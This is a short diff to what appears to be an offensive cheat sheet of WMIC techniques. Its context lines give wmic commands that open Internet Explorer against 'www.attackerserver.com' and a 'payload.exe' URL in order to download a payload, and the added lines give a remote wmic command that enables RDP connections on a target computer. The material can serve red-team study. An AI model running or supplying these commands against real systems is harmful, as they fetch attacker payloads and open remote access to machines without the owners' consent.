@@ -177,3 +177,8 @@
 * wmic open file and urşl download payload  
 -> wmic process call create "C:\Program Files\Internet Explorer\iexplore.exe www.attackerserver.com"
 -> wmic process call create "C:\Program Files\Internet Explorer\iexplore.exe http://1.1.1.1/payload.exe"
+
+* Enable RDP with wmic command
+-> wmic /node:"computername" path Win32_TerminalServiceSetting where AllowTSConnections=“0” call SetAllowTSConnections “1”
+
+
